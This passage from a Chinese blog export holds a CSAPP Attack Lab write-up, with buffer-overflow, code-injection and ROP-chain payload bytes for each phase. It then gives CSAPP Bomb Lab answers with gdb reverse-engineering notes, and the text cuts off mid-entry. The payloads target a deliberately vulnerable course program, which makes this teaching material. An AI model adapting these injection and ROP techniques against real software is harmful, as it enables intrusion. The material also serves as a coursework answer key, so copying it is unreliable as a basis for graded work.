title=\"CSAPP Attack Lab\"></a>CSAPP Attack Lab</h1><blockquote>\n<p>本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符</p>\n</blockquote>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><h4 id=\"答案\"><a href=\"#答案\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\"><span class=\"comment\">/* this five lines fill the buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c0 <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span>\t<span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch1's addr */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上<code>touch1</code>的地址（直接用十六进制写），然后用<code>hex2raw</code>转换后输入即可AC</li>\n</ul>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><h4 id=\"答案-1\"><a href=\"#答案-1\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ec <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch2的地址 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">83</span> ec <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"comment\">/* sub  $0x30, %rsp */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> c7 c7 fa <span class=\"number\">97</span> b9 <span class=\"number\">59</span> </span><br><span class=\"line\"><span class=\"comment\">/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">c3 <span class=\"comment\">/* retq */</span></span><br><span class=\"line\"></span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa  aa aa aa aa </span><br><span class=\"line\">aa aa aa aa </span><br><span class=\"line\"><span class=\"comment\">/* 填充的字符串 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">80</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span></span><br><span class=\"line\"><span class=\"comment\">/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置</li>\n<li>需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址</li>\n</ul>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><h4 id=\"答案-2\"><a href=\"#答案-2\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fa <span class=\"number\">18</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch3 addr, in 0x5561dc78 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">83</span> ec <span class=\"number\">30</span> </span><br><span class=\"line\"><span class=\"comment\">/* sub $0x30,%rsp, in 0x5561dc80 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> c7 c7 <span class=\"number\">90</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span> </span><br><span class=\"line\"><span class=\"comment\">/* mov  $0x5561dc90,%rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c3 </span><br><span class=\"line\"><span class=\"comment\">/* retq will ret to 0x5561dc78 */</span>   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/*fill the extra space */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">35</span> <span class=\"number\">39</span> <span class=\"number\">62</span> <span class=\"number\">39</span> <span class=\"number\">39</span> <span class=\"number\">37</span> <span class=\"number\">66</span> <span class=\"number\">61</span>\t<span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* string \"59b997fa\" ，in 0x5561dc90 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">aa aa aa aa aa aa aa </span><br><span class=\"line\"><span class=\"comment\">/* fill the extra space */</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">80</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* 0x5561dc80, our code's begin addr */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">* just before our attack code is run, </span></span><br><span class=\"line\"><span class=\"comment\">* rsp == 0x5561dca0 </span></span><br><span class=\"line\"><span class=\"comment\">* return addr in 0x5561dca0</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串</li>\n<li>然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80</li>\n<li>接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶</li>\n</ul>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><h4 id=\"答案-3\"><a href=\"#答案-3\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\"><span class=\"comment\">/* this five line fill the buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\">cc <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x4019cc\t pop %rax; nop; ret */</span></span><br><span class=\"line\"></span><br><span class=\"line\">fa <span class=\"number\">97</span> b9 <span class=\"number\">59</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x59b997fa */</span></span><br><span class=\"line\"></span><br><span class=\"line\">a2 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x4019a2\t movq %rax, %rdi; ret */</span></span><br><span class=\"line\"></span><br><span class=\"line\">ec <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* touch2 0x4017ec */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>构造rop链，在0x4019ca处有<code>b8 29 58 90 c3 mov $0xc3905829,%eax</code>，观察字节码，在0x4019cc处的<code>58</code>是<code>pop rax</code>，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax</li>\n<li>在0x4019a0有<code>8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax</code>，观察字节码，0x4019a2处有<code>48 89 c7</code>，也就是<code>mov %rax, %rdi</code>，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了</li>\n</ul>\n<h3 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h3><h4 id=\"答案-4\"><a href=\"#答案-4\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa\t\t</span><br><span class=\"line\"><span class=\"comment\">/* this five lines fill space of buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">17</span> <span class=\"number\">2b</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t \t</span><br><span class=\"line\"><span class=\"comment\">/* 402b17, pop rsi,ret to this, assume that rsp is K */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">20</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* the data pop to rsi */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* the data are pop to r15 */</span></span><br><span class=\"line\"><span class=\"comment\">/* after all pop, rsp is K+16 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">06</span> <span class=\"number\">1</span>a <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">a2 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019a2, movq rax, rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">d6 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c5 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019c5, mov rax, rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">fa <span class=\"number\">18</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4018fa touch3 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">35</span> <span class=\"number\">39</span> <span class=\"number\">62</span> <span class=\"number\">39</span> <span class=\"number\">39</span> <span class=\"number\">37</span> <span class=\"number\">66</span> <span class=\"number\">61</span>\t<span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x59b997fa in here */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后</p>\n</li>\n<li><p>用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的<code>lea (%rdi,%rsi,1),%rax</code>符合要求</p>\n</li>\n<li><p>为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到<code>pop %r14</code>，该指令第二个字节<code>5e</code>是<code>pop %rsi</code>，因为该指令跟ret之间还有<code>pop %r15</code>，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。</p>\n<blockquote>\n<p>r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）</p>\n</blockquote>\n</li>\n<li><p>之后用多个mov，实现rsp mov到rax再mov到rdi</p>\n</li>\n<li><p>然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi</p>\n</li>\n<li><p>接着就是touch3的地址，让<code>mov rax rdi</code>下面那条ret直接跳转到touch3，攻击成功</p>\n</li>\n</ul>\n<h3 id=\"几个注意点\"><a href=\"#几个注意点\" class=\"headerlink\" title=\"几个注意点\"></a>几个注意点</h3><ul>\n<li>用vim的16进制编辑模式要加在打开vim时加<code>-b</code>，否则，会把诸如<code>c0</code>这一类大于<code>0x3f</code>的不属于ascii范围的字符修改成<code>3f</code></li>\n</ul>\n<ul>\n<li>ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节</li>\n<li>指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址</li>\n<li>ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置</li>\n<li>注意gets遇到编码为0xFF的字符时不会终止读取</li>\n</ul>\n","slug":"CSAPP-Attack-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"CSAPP Bomb Lab","date":"2017-09-14T18:04:11.000Z","path":"2017/09/15/CSAPP-Bomb-Lab/","text":"CSAPP Bomb Lab答案 Border relations with Canada have never been better. 1 2 4 8 16 32 多个答案 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 应该有多个答案 7 0 一个6个字符的字符串，字符串的ascii值依次为 $9+k\\times16$ $15+k\\times16$ $14+k\\times16$ $5+k\\times16$ $6+k\\times16$ $7+k\\times16$ ​ 4 3 2 1 6 5 第一题解答思路 string_not_equal函数比对(0x402400)位置的string与输入的string 直接运行gdb，print (char*)0x402400即可 不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333 第二题解答思路 汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入1 2 4 8 16 32即可AC 第三题解题思路 12345lea 0xc(%rsp),%rcx //rcx=12+rsplea 0x8(%rsp),%rdx //rdx=8+rspmov $0x4025cf,%esi //%d %dmov $0x0,%eaxcallq 400bf0 &lt;__isoc99_sscanf@plt&gt; 从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdbprint (char*)0x4025cf打印出&quot;%d %d&quot; 然后测试读入的第一个数字是否大于7，如果是，explode_bomb 然后就是一个switch，用gdbx/14w 0x402470打印出 12340x402470: 0x00400f7c 0x00000000 0x00400fb9 0x000000000x402480: 0x00400f83 0x00000000 0x00400f8a 0x000000000x402490: 0x00400f91 0x00000000 0x00400f98 0x000000000x4024a0: 0x00400f9f 0x00000000 按照对应关系确定第二个读入的数字即可 第四题解题思路 同样是用sscanf读入两个数字 由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果 第五题解题思路 12callq 40131b &lt;string_length&gt;cmp $0x6,%eax 读入6个字符的字符串 123456movzbl (%rbx,%rax,1),%ecxmov %cl,(%rsp)mov (%rsp),%rdxand $0xf,%edxmovzbl 0x4024b0(%rdx),%edxmov %dl,0x10(%rsp,%rax,1) 提取每个字符的ascii的低4bits，放在edx里，然后从0x4024b0+edx的位置读入数据放在栈上 123mov $0x40245e,%esilea 0x10(%rsp),%rdicallq 401338 &lt;strings_not_equal&gt; 后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。 用gdb分别打印0x4024b0 0x40245e处的字符串，获得 maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? flyers 此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与flyers比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$ 但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符 第六题一些心得 不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码 1234567891011#from 代码段的401153lea 0x18(%rsp),%rsimov %r14,%raxmov $0x7,%ecxmov %ecx,%edxsub (%rax),%edxmov %edx,(%rax)add $0x4,%raxcmp %rsi,%raxjne 401160 &lt;phase_6+0x6c&gt; 大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能 安利一个gdb插件peda，大大提高gdb的用户体验 解题思路 整段代码分为 个部分 0x4010fc 到 0x401106：读入6个数值 0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333） 0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性） 0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。 其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令x/30w 0x6032d0打印改地址附近的多个字节，结果如下 1234560x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x000000000x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x000000000x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x000000000x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x000000000x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x000000000x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。 由此可以知道该段代码的功能为把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。 node地址在栈上关于读入的数字的分布规则为 node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0 node地址按照读入数字的顺序，排列在栈上。 0x4011ab 到 0x4011d9：该段从%rsp+0x20开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下： 12345678910111213141516171819struct node&#123; int num; int index; node *next;&#125;;node **next = %rsp+0x28;node **endnode = %rsp+0x50;node *currentnode = *(%rsp+0x20);node *temp;while(1)&#123; temp = *next; currentnode-&gt;next = temp; next += 1; //in fact, it add 8 bytes; if(endnode==next) break; currentnode = temp;&#125;temp-&gt;next = null; 0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。","raw":"---\ntitle: CSAPP Bomb Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-15 02:04:11\ntags:\n- CSAPP Lab\ndescription: CSAPP 炸弹实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP Bomb Lab\n\n### 答案\n\n1. Border relations with Canada have never been better.\n2. 1 2 4 8 16 32\n3. 多个答案\n   - 0    207\n   - 1    311\n   - 2    707\n   - 3    256\n   - 4    389\n   - 5    206\n   - 6    682\n   - 7    327\n4. *应该有多个答案*\n   - 7    0\n5. 一个6个字符的字符串，字符串的ascii值依次为\n   - $9+k\\times16$ \n   - $15+k\\times16$\n   - $14+k\\times16$\n   - $5+k\\times16$\n   - $6+k\\times16$\n   - $7+k\\times16$\n6. ​      4 3 2 1 6 5\n\n### 第一题\n\n#### 解答思路\n\n- string_not_equal函数比对(0x402400)位置的string与输入的string\n- 直接运行gdb，`print (char*)0x402400`即可\n- *不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333*\n\n### 第二题\n\n#### 解答思路\n\n- 汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入`1  2  4  8  16  32`即可AC\n\n### 第三题\n\n#### 解题思路\n\n- ```assembly\n  lea    0xc(%rsp),%rcx //rcx=12+rsp\n  lea    0x8(%rsp),%rdx //rdx=8+rsp\n  mov    $0x4025cf,%esi //%d %d\n  mov    $0x0,%eax\n  callq  400bf0 <__isoc99_sscanf@plt>\n  ```\n\n  从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb`print (char*)0x4025cf`打印出`\"%d %d\"`\n\n- 然后测试读入的第一个数字是否大于7，如果是，explode_bomb\n\n- 然后就是一个switch，用gdb`x/14w 0x402470`打印出\n\n  ```assembly\n  0x402470:\t0x00400f7c\t0x00000000\t0x00400fb9\t0x00000000\n  0x402480:\t0x00400f83\t0x00000000\t0x00400f8a\t0x00000000\n  0x402490:\t0x00400f91\t0x00000000\t0x00400f98\t0x00000000\n  0x4024a0:\t0x00400f9f\t0x00000000\n  ```\n\n  按照对应关系确定第二个读入的数字即可\n\n### 第四题\n\n#### 解题思路\n\n- 同样是用sscanf读入两个数字\n- 由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果\n\n### 第五题\n\n#### 解题思路\n\n- ```assembly\n  callq  40131b <string_length>\n  cmp    $0x6,%eax\n  ```\n\n  读入6个字符的字符串\n\n- ```assembly\n  movzbl (%rbx,%rax,1),%ecx\n  mov    %cl,(%rsp)\n  mov    (%rsp),%rdx\n  and    $0xf,%edx\n  movzbl 0x4024b0(%rdx),%edx\n  mov    %dl,0x10(%rsp,%rax,1)\n  ```\n\n  提取每个字符的ascii的低4bits，放在`edx`里，然后从`0x4024b0+edx`的位置读入数据放在栈上\n\n- ```assembly\n  mov    $0x40245e,%esi\n  lea    0x10(%rsp),%rdi\n  callq  401338 <strings_not_equal>\n  ```\n\n  后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。\n\n- 用gdb分别打印0x4024b0  0x40245e处的字符串，获得\n\n  - `maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?`\n  -  `flyers`\n\n- 此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与`flyers`比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$\n\n- 但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符\n\n### 第六题\n\n#### 一些心得\n\n- 不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码\n\n  ```assembly\n  #from 代码段的401153\n  lea    0x18(%rsp),%rsi\n  mov    %r14,%rax\n  mov    $0x7,%ecx\n\n  mov    %ecx,%edx\n  sub    (%rax),%edx\n  mov    %edx,(%rax)\n  add    $0x4,%rax\n  cmp    %rsi,%rax\n  jne    401160 <phase_6+0x6c>\n  ```\n\n  大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能\n\n- 安利一个gdb插件[peda](https://github.com/longld/peda)，大大提高gdb的用户体验\n\n#### 解题思路\n\n- 整段代码分为 个部分\n\n  - 0x4010fc 到 0x401106：读入6个数值\n\n  - 0x40110b 到 